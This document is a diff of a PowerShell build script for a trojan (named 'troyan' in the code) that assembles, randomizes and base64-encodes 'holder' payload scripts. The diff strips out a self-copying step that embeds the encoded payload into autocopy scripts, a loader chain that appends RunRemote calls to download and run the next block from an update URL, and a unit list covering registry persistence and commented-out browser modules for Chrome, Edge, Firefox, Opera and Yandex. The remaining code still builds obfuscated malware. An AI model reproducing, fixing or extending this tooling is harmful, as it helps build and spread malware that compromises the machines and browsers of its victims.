@@ -157,21 +157,7 @@ function Encode-FileToBase64 {
     return $encodedContent
 }
 
-function Convert-StringToBase64 {
-    param (
-        [Parameter(Mandatory = $true)]
-        [string]$InputString
-    )
-    
-    # Convert the string to bytes
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
-    
-    # Encode the bytes to a Base64 string
-    $base64String = [Convert]::ToBase64String($bytes)
-    
-    # Return the Base64-encoded string
-    return $base64String
-}
+
 
 function Convert-ArrayToQuotedString {
     param (
@@ -341,28 +327,6 @@ function Make-Template-AutoExtract {
     $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autoextract.ps1")
 }
 
-function Make-Template-AutoCopy{param ([string]$selfTemplate)
-    $template = @"
-
-    `$xholder = "__SELF"
-
-"@
-   
-    $template = $template -replace "__SELF", $selfTemplate
-    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
-}
-
-function Enrich-AutoCopy { 
-    param ([string]$targetFile)
-
-    $template = GetUtfNoBom -file $targetFile
-    $add = GetUtfNoBom -file (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
-    $template = $add + $template
-    Utf8NoBom -data $template -file $targetFile
-}
-    
-
-
 
 function Make-Ps1Files {
     param ([string]$target)
@@ -378,7 +342,7 @@ function Make-Ps1Files {
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("autocopy.ps1", "autoextract.ps1", "autoregistry.ps1", "embeddings.ps1", "autoupdate.ps1") }
     $holderFiles += $allFiles | Where-Object { $_.Name -in @("holder_mono.ps1") }
 
-    $exceptFiles = $allFiles | Where-Object { $_.Name -in @("holder.ps1") -or $_.Name -in @("holder_suffix.ps1") -or $_.Name -in @("consts_autocopy.ps1")}
+    $exceptFiles = $allFiles | Where-Object { $_.Name -in @("holder.ps1") -or $_.Name -in @("holder_suffix.ps1")}
 
     if ($target -ne "body")
     {
@@ -433,7 +397,6 @@ function BuldScriptMono{
         $fileContent = $fileContent -replace '. ./consts_body.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_cert.ps1', "`n`n"
-        $fileContent = $fileContent -replace '. ./consts_autocopy.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts_autoextract.ps1', "`n`n"
         if ($random -eq $true)
         {
@@ -470,13 +433,7 @@ Make-Template-AutoExtract
 $files = Make-Ps1Files -target "holder_mono"
 BuldScriptMono -files $files -outputFile $server.troyanHolderMono -random $true
 BuldScriptMono -files $files -outputFile $server.troyanHolderCleanMono -random $false
-
-$holderSelf = Encode-FileToBase64 -inFile $server.troyanHolderMono
-Make-Template-AutoCopy -selfTemplate $holderSelf
-Enrich-AutoCopy -targetFile  $server.troyanHolderMono
-Enrich-AutoCopy -targetFile  $server.troyanHolderCleanMono
 ##
-
 
 
 function BuldScript { param ([bool]$random)
@@ -524,62 +481,11 @@ function BuldScript { param ([bool]$random)
 
     function make
     {
-        param ([object]$cur, [object]$next)
-
-        $fn = $cur.block
-        $base = $server.updateUrlBlock
-        $isJob = "`$false"
-        if ($next.isJob){
-              $isJob = "`$true"
-        }
-        $isWait = "`$false"
-        if ($next.isWait){
-            $isWait = "`$true"
-        }
-        $nextBlock = $next.block
-
+            param ([string]$fn)
         $fileContent =""
-
-        if ($fn -eq "holder")
-        {
-        
-            $rew = "
-
-. ./consts_body.ps1
-. ./utils.ps1
-
-"
-            Utf8NoBom -data $rew -file (Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
-        }
 
         $fileContent = (get -name $fn)
         
-        if ($fn -ne "holder")
-        {
-            $fileContent +=  "
-            
-                ###GENERATED
-                do_$fn
-                
-            ";
-        }
-        if ($null -ne $nextblock -and $nextblock -ne "")
-        {
-            $fileContent +=  "
-    
-            ###GENERATED
-            RunRemote -baseUrl '$base' -isJob $isJob -isWait $isWait -block '$nextblock'
-            
-            ";
-        }
-
-        if ($fn -eq "holder")
-        {
-            $tarSrc=(Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
-            Utf8NoBom -data $fileContent -file $tarSrc
-        }
-
-
         $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
         $fileContent = $pref + (rnd) + $utils + (rnd) + $consts_body + (rnd) + $fileContent + $suff
         
@@ -600,58 +506,11 @@ function BuldScript { param ([bool]$random)
         Utf8NoBom -data $encoded -file $outFile
     }
 
-    $units = @(
-        [PSCustomObject]@{ block = "holder"; isJob = $true; isWait = $true},
+    $allFiles = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
 
-        [PSCustomObject]@{ block = "autocopy"; isJob = $true; isWait = $true },
-
-        [PSCustomObject]@{ block = "autoregistry"; isJob = $true; isWait = $true}
-
-
-        # [PSCustomObject]@{ block = "dnsman"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "cert"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "chrome"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "edge"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "yandex"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "firefox"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "opera"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "chrome_ublock"; isJob = $true; isWait = $false }
-        
-        # [PSCustomObject]@{ block = "chrome_push"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "tracker"; isJob = $true; isWait = $false }
-
-        # [PSCustomObject]@{ block = "extraupdate"; isJob = $true; isWait = $false }
-    )
-    
-
-    for ($no = 0; $no -lt $units.Length; $no++)
-    {
-        $cur = $units[$no]
-        $next = if ($no + 1 -lt $units.Count) { $units[$no + 1] } else { $null }
-        if ($cur.isStop)
-        {
-            $next = $null
-        }
-
-        Write-Output "Iteration $no :"
-        Write-Output "Current: Block = $($cur.block), isJob = $($cur.isJob), isWait = $($cur.isWait)"
-        if ($null -ne $next) {
-            Write-Output "Next: Block = $($next.block), isJob = $($next.isJob), isWait = $($next.isWait)"
-        } else {
-            Write-Output "Next: None"
-        }
-        
-        make -cur $cur, -next $next 
-        
-        Write-Output "----"
+    foreach ($file in $allFiles)
+    {  
+        make -fn $file.BaseName
     }
 }
 
@@ -659,12 +518,6 @@ BuldScript -random $false
 BuldScript -random $true
 Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.ps1") -Destination $server.troyanHolder -Force
 Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.c.ps1") -Destination $server.troyanHolderClean -Force
-$holderSelf = Encode-FileToBase64 -inFile $server.troyanHolder
-Make-Template-AutoCopy -selfTemplate $holderSelf
-Enrich-AutoCopy -targetFile  (Join-Path -Path $server.troyanOutputBlock -ChildPath "autocopy.c.ps1")
-Enrich-AutoCopy -targetFile  (Join-Path -Path $server.troyanOutputBlock -ChildPath "autocopy.ps1")
-$encoded = Encode-FileToBase64 -inFile (Join-Path -Path $server.troyanOutputBlock -ChildPath "autocopy.ps1")
-Utf8NoBom -data $encoded -file (Join-Path -Path $server.troyanOutputBlock -ChildPath "autocopy.txt")
 
 $outPath = $server.userTroyanBlock
 if (-not [string]::IsNullOrEmpty($outPath)) 
@@ -676,4 +529,4 @@ if (-not [string]::IsNullOrEmpty($outPath))
 }
 Copy-Item -Path $server.troyanOutputBlock -Destination $server.userDataDir -Force -Recurse
 
-# Write-Host "Troyan Compile complete"
+Write-Host "Troyan Compile complete $serverName"
